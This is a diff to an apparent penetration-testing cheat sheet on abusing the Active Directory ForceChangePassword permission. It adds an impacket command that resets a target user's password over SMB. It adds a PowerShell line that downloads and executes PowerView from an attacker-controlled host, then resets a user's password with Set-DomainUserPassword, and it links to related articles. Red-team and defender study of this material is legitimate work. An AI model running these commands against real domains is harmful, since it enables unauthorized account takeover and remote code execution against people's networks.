@@ -18,9 +18,12 @@ Ldap_shell -> `ldap_shell <domain>/<user>:<password> -dc-ip <ip>`
 
 <br>
 
-Using SMB protocol:
+Using SMB protocol.
+ - In case LDAP is not an option you can still abuse ForceChangePassword over SMB protocol using impacket tools:
 
-`impacket-changepasswd <domain>/<target_user>@<ip> -newpass <new_password> -altuser <controlled_user>/raj -altpass <controlled_user_password> -reset`
+`changepasswd.py <domain>/<target_user>@<ip> -newpass <new_password> -altuser <domain>/<controlled_user> -altpass <controlled_user_password> -reset`
+
+Note: use 'impacket-changepasswd' for kali, and 'changepasswd.py' from normal UNIX/LINUX machines.
 
 <br>
 
@@ -38,10 +41,15 @@ Ldap_shell -> `ldap_shell '<domain>/<user>:' -hashes fffffffffffffffffffffffffff
 
 ### From Windows (internally):
 
+Load powerview -> `IEX (new-object net.webclient).downloadstring('http://<your_evil_ip_or_domain>/powerview.ps1')`
+
+`$NewPassword = ConvertTo-SecureString '<new_password>' -AsPlainText -Force`
+
+`Set-DomainUserPassword -Identity '<target_user>' -AccountPassword $NewPassword`
 
 
 
+### Articles:
 
-
-
-
+https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/
+https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
